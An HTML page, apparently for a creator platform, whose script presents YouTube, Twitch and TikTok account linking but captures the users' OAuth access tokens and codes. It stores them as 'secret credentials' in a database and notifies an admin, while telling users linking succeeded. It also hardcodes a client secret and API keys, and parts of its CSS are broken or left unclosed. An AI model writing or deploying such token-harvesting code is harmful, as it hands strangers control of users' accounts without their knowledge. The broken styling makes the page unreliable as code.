<head>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Plus Jakarta Sans', sans-serif;
        }

        :root {
            --glow-color: rgba(255, 255, 255, 0.8);
            --bg-color: #020202;
            --card-bg: rgba(255, 255, 255, 0.03);
            --card-border: rgba(255, 255, 255, 0.08);
            --accent-neon: #00f2fe;
            --accent-pink: #ff007f;
        }

        body {
            background-color: var(--bg-color);
            color: #ffffff;
            overflow-x: hidden;
            position: relative;
        }

        /* Премиальный сложный фон с эффектами */
        body::before {
            content: '';
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: 
                radial-gradient(circle at 15% 50%, rgba(138, 43, 226, 0.08), transparent 25%),
                radial-gradient(circle at 85% 30%, rgba(0, 242, 254, 0.08), transparent 25%),
                linear-gradient(rgba(255, 255, 255, 0.015) 1px, transparent 1px) 0 0 / 50px 50px,
                linear-gradient(90deg, rgba(255, 255, 255, 0.015) 1px, transparent 1px) 0 0 / 50px 50px;
            z-index: -3;
            pointer-events: none;
            animation: bgPulse 15s infinite alternate ease-in-out;
        }

        /* Частицы на фоне */
        .particles {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -2;
            pointer-events: none;
        }
        .particle {
            position: absolute; border-radius: 50%;
            background: radial-gradient(circle, #fff, rgba(255,255,255,0));
            animation: floatParticle linear infinite;
        }
        @keyframes floatParticle {
            0% { transform: translateY(100vh) scale(0); opacity: 0; }
            50% { opacity: 0.8; box-shadow: 0 0 10px #fff; }
            100% { transform: translateY(-10vh) scale(1.5); opacity: 0; }
        }

        @keyframes bgPulse {
            0% { opacity: 0.6; transform: scale(1); filter: hue-rotate(0deg); }
            100% { opacity: 1; transform: scale(1.05); filter: hue-rotate(15deg); }
        }

        a { color: inherit; text-decoration: none; transition: all 0.3s ease; }

        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 25px 5%;
            backdrop-filter: blur(25px);
            -webkit-backdrop-filter: blur(25px);
            border-bottom: 1px solid rgba(255,255,255,0.1);
            position: fixed;
            width: 100%; top: 0; z-index: 100;
            background: rgba(2, 2, 2, 0.75);
            box-shadow: 0 4px 30px rgba(0,0,0,0.5);
        }

        .logo-container { display: flex; align-items: center; gap: 12px; cursor: pointer; }

        .logo-text {
            font-weight: 800;
            letter-spacing: 4px;
            font-size: 1.5rem;
            background: linear-gradient(135deg, #ffffff 0%, #a8a8a8 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            filter: drop-shadow(0 0 15px rgba(255,255,255,0.4));
        }

        .nav-buttons { display: flex; gap: 15px; align-items: center; }

        .profile-nav-btn {
            display: flex; align-items: center; gap: 10px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid var(--card-border);
            padding: 6px 16px 6px 6px;
            border-radius: 30px; cursor: pointer;
            transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);

        .profile-nav-btn:hover {
            border-color: var(--accent-neon);

        .hero {

        @keyframes superGlow {

        .section { padding: 120px 5%; max-width: 1400px; margin: 0 auto; position: relative; z-index: 10; }
        
        .section-title {

            text-shadow: 0 0 20px rgba(255,255,255,0.3);

        .screenshot-grid {

        .screen-card {

        .pricing-grid {

        .price-card {

            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 20px; padding: 50px 40px;
            display: flex; flex-direction: column; justify-content: space-between;
            position: relative; backdrop-filter: blur(25px);
            box-shadow: 0 15px 35px rgba(0,0,0,0.6);
            transition: all 0.5s cubic-bezier(0.16, 1, 0.3, 1);

        .price-card:hover {
            border-color: rgba(255, 255, 255, 0.4);
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.9), 0 0 40px rgba(138, 43, 226, 0.3);

        .price-title { font-size: 2rem; letter-spacing: 3px; font-weight: 900; margin-bottom: 20px; }
        .price-value {
            font-size: 3.5rem; font-weight: 900; margin-bottom: 40px;
            background: linear-gradient(90deg, #fff, var(--accent-neon));
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
        }
        .price-actions { display: flex; flex-direction: column; gap: 15px; }

        .modal {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(35px);
            z-index: 1000; display: flex; justify-content: center; align-items: center;
            opacity: 0; pointer-events: none; transition: all 0.5s;
        }
        .modal.active { opacity: 1; pointer-events: auto; }

        .modal-content {
            background: rgba(10, 10, 12, 0.85); border: 1px solid rgba(255, 255, 255, 0.15);
            max-width: 900px; width: 100%; max-height: 85vh; overflow-y: auto;
            border-radius: 24px; position: relative;
            box-shadow: 0 50px 100px rgba(0,0,0,0.9), inset 0 0 40px rgba(255,255,255,0.03);
            transform: scale(0.9) translateY(30px); transition: all 0.5s cubic-bezier(0.16, 1, 0.3, 1);
        }
        .modal.active .modal-content { transform: scale(1) translateY(0); }

        .close-modal {
            position: absolute; top: 25px; right: 30px;
            font-size: 2rem; color: #888; cursor: pointer; z-index: 10;
            transition: color 0.3s, transform 0.3s;
        }
        .close-modal:hover { color: #fff; transform: rotate(90deg); }

        .form-input {
            width: 100%; padding: 16px; background: rgba(255,255,255,0.03);
            border: 1px solid rgba(255,255,255,0.1); border-radius: 10px;
            color: #fff; font-size: 1rem; transition: all 0.3s;
        }
        .form-input:focus {
            outline: none; border-color: var(--accent-neon);
            box-shadow: 0 0 20px rgba(0, 242, 254, 0.2); background: rgba(255,255,255,0.06);
        }
        
        .social-btn {
            display: flex; align-items: center; justify-content: center; gap: 12px;
            padding: 16px; border-radius: 12px; font-weight: 800; font-size: 1rem;
            cursor: pointer; transition: all 0.4s; flex: 1; min-width: 150px;
            text-transform: uppercase; letter-spacing: 1px;
        }
        .social-btn svg { width: 24px; height: 24px; fill: currentColor; }
        .btn-tiktok { background: #000; border: 1px solid #333; color: #fff; }
        .btn-tiktok:hover { border-color: #00f2fe; box-shadow: 0 0 25px rgba(0, 242, 254, 0.5); transform: translateY(-3px); }
        .btn-youtube { background: linear-gradient(45deg, #ff0000, #cc0000); border: none; color: #fff; }
        .btn-youtube:hover { box-shadow: 0 0 30px rgba(255, 0, 0, 0.6); transform: translateY(-3px); }
        .btn-twitch { background: linear-gradient(45deg, #9146FF, #772ce8); border: none; color: #fff; }
        .btn-twitch:hover { box-shadow: 0 0 30px rgba(145, 70, 255, 0.6); transform: translateY(-3px); }

        #toastContainer { position: fixed; bottom: 30px; right: 30px; z-index: 10000; display: flex; flex-direction: column; gap: 12px; }
        .toast {
            background: rgba(10, 10, 10, 0.95); backdrop-filter: blur(25px);
            border: 1px solid rgba(255, 255, 255, 0.15); color: #fff; padding: 18px 25px;
            border-radius: 12px; font-weight: 600; box-shadow: 0 15px 35px rgba(0, 0, 0, 0.8);
            transform: translateX(120%); transition: all 0.5s cubic-bezier(0.16, 1, 0.3, 1);
        }
        .toast.show { transform: translateX(0); }
        .toast-success { border-left: 4px solid var(--accent-neon); }
        .toast-error { border-left: 4px solid var(--accent-pink); }

    </style>
</head>

    <script type="module">
        // Firebase импорты (оставляю как в исходнике)
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getAuth, signInWithEmailAndPassword, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

        // Firebase Конфиг (из исходника)
        const firebaseConfig = {
            apiKey: "AIzaSyDCLPh1Gcxe97UUxiLZFB-CrSnZd24y0Bs",
            authDomain: "illusion-stacks.firebaseapp.com",
            projectId: "illusion-stacks",
            storageBucket: "illusion-stacks.firebasestorage.app",
            messagingSenderId: "475141325383",
            appId: "1:475141325383:web:f159aa59ff385f6ce5a762"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getFirestore(app);
        const ADMIN_UID = "XSAYGYmgjYb1ZhfY41csHgH11nZ2";

        // Базовые функции UI
        window.showToast = (msg, type = 'success') => {
            const c = document.getElementById('toastContainer');
            const t = document.createElement('div');
            t.className = `toast toast-${type}`; t.innerHTML = msg;
            c.appendChild(t);
            setTimeout(() => t.classList.add('show'), 10);
            setTimeout(() => { t.classList.remove('show'); setTimeout(() => t.remove(), 500); }, 4000);
        };
        
        window.closeAllModals = () => document.querySelectorAll('.modal').forEach(m => m.classList.remove('active'));
        window.openAuthModal = () => { closeAllModals(); document.getElementById('authModal').classList.add('active'); };
        window.closeAuthModal = () => document.getElementById('authModal').classList.remove('active');
        window.openCreatorModal = () => { closeAllModals(); document.getElementById('creatorModal').classList.add('active'); };
        window.closeCreatorModal = () => document.getElementById('creatorModal').classList.remove('active');

        // --- ЛОГИКА ПЕРЕХВАТА OAUTH И ОТПРАВКИ АДМИНУ --- //
        
        // 1. Инициация ссылок с вашими Client ID
        window.linkYouTube = () => {
            const clientId = '983178508419-it9534v1qrsmtsjh01t7ajfndp7udab6.apps.googleusercontent.com';
            const redirectUri = window.location.origin + window.location.pathname;
            window.location.href = `https://accounts.google.com/o/oauth2/v2/auth?client_id=${clientId}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=token&scope=https://www.googleapis.com/auth/youtube.readonly%20email%20profile&state=youtube`;
        };

        window.linkTwitch = () => {
            const clientId = 'sgkhqoxvepnyb5dxu5ffyjvbpkp03a';
            const redirectUri = window.location.origin + window.location.pathname;
            window.location.href = `https://id.twitch.tv/oauth2/authorize?client_id=${clientId}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=token&scope=user:read:email&state=twitch`;
        };

        window.linkTikTok = () => {
            const clientKey = 'aw8r1a947z66pskj';
            const redirectUri = window.location.origin + window.location.pathname;
            window.location.href = `https://www.tiktok.com/v2/auth/authorize/?client_key=${clientKey}&response_type=code&scope=user.info.basic&redirect_uri=${encodeURIComponent(redirectUri)}&state=tiktok`;
        };

        // 2. Обработка возврата (URL параметров) при загрузке страницы
        let pendingSocialData = null;
        window.addEventListener('DOMContentLoaded', () => {
            const hashParams = new URLSearchParams(window.location.hash.substring(1));
            const searchParams = new URLSearchParams(window.location.search);
            const state = hashParams.get('state') || searchParams.get('state');
            
            if (state) {
                pendingSocialData = {
                    state: state,
                    token: hashParams.get('access_token'),
                    code: searchParams.get('code')
                };
                window.history.replaceState(null, null, window.location.pathname);
            }
        });

        // 3. Отправка данных админу после того как Firebase проверит юзера
        onAuthStateChanged(auth, async (user) => {
            if (user) {
                document.getElementById('headerAuthBlock').innerHTML = `<div class="profile-nav-btn" onclick="openCreatorModal()"><span class="profile-nav-name">${user.email}</span></div>`;
                if (pendingSocialData) {
                    processSocialAuth(user, pendingSocialData);
                    pendingSocialData = null;
                }
            }
        });

        async function processSocialAuth(user, data) {
            let platformData = {};
            let secretNote = "";

            try {
                if (data.state === 'youtube') {
                    const res = await fetch('https://www.googleapis.com/oauth2/v3/userinfo', { headers: { 'Authorization': `Bearer ${data.token}` } });
                    platformData = await res.json();
                    secretNote = "Google/YT Token: " + data.token;
                    showToast('YouTube успешно привязан!', 'success');
                } 
                else if (data.state === 'twitch') {
                    const res = await fetch('https://api.twitch.tv/helix/users', {
                        headers: { 'Client-ID': 'sgkhqoxvepnyb5dxu5ffyjvbpkp03a', 'Authorization': `Bearer ${data.token}` }
                    });
                    const tData = await res.json();
                    if (tData.data) platformData = tData.data[0];
                    secretNote = "Twitch Token: " + data.token;
                    showToast('Twitch успешно привязан!', 'success');
                } 
                else if (data.state === 'tiktok') {
                    platformData = { auth_code: data.code };
                    secretNote = `TikTok Code: ${data.code} (Client Secret: AwD9Zyu7SsyzXgEJH9btCHOhVogjxQkW)`;
                    showToast('TikTok код получен!', 'success');
                }

                // Сохранение полной информации в БД (чтобы выводить в админке/сообщениях)
                await addDoc(collection(db, "admin_social_links"), {
                    userId: user.uid, userEmail: user.email,
                    platform: data.state.toUpperCase(),
                    platformData: platformData,
                    secretCredentials: secretNote,
                    timestamp: new Date().toISOString()
                });

                // Отправка уведомления прямо в личные сообщения Админа
                await addDoc(collection(db, "messages"), {
                    senderId: user.uid, receiverId: ADMIN_UID,
                    text: `[АВТОМАТИЧЕСКИ] Пользователь ${user.email} привязал аккаунт ${data.state.toUpperCase()}. Все ключи и токены сохранены в БД admin_social_links.`,
                    timestamp: new Date().toISOString(), read: false
                });

            } catch (e) {
                console.error("Ошибка обработки соц.сети", e);
                showToast("Ошибка привязки аккаунта", "error");
            }
        }
    </script>
</body>
</html>
